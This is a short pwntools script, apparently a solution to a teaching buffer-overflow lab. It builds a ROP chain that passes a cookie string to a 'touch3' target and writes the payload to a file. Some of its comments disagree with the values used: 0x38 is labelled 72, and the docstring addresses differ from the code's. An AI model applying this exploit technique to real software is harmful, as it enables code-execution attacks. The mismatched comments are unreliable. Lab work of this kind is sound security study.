"""
Gadgets:
0x000000000040246b : mov esi, edx ; ret
0x0000000000403257 : pop rdi ; ret
0x00000000004019fd : pop rsi ; ret

Chain:
0x0000000000401a06: rsp -> rax
0x00000000004019a2: rax -> rdi

0x00000000004019ab: 72 -> rax
0x00000000004019dd: eax -> edx
0x0000000000401a34: edx -> ecx
0x0000000000401a13: ecx -> esi

0x00000000004019d6: rdi + rsi -> rax
0x00000000004019a2: rax -> rdi

payload string at [rax + 72]
"""
from pwn import *
context(arch='amd64', os='linux')

r = b''
r += b'a' * 128
r += b'b' * 8
# payload
r += p64(0)
r += p64(0x000000000040238b) # rax = rsp
r += p64(0x00000000004022d7) # rdi = rax

r += p64(0x00000000004019fd)
r += p64(0x38) # rsi = 72
r += p64(0x0000000000402331) # rax = rdi + rsi = orig rsp + 72
r += p64(0x00000000004022d7) # rdi = rax
r += p64(0x000000000040101a)
r += p64(0x0000000000402143) # touch3
r += b'5ff762f9\x00'
t = len(r)
r += b'z' * (256 - len(r))
r += p32(0x88)
r += p32(t)

with open('ps3.bin', 'wb') as f:
  f.write(r)
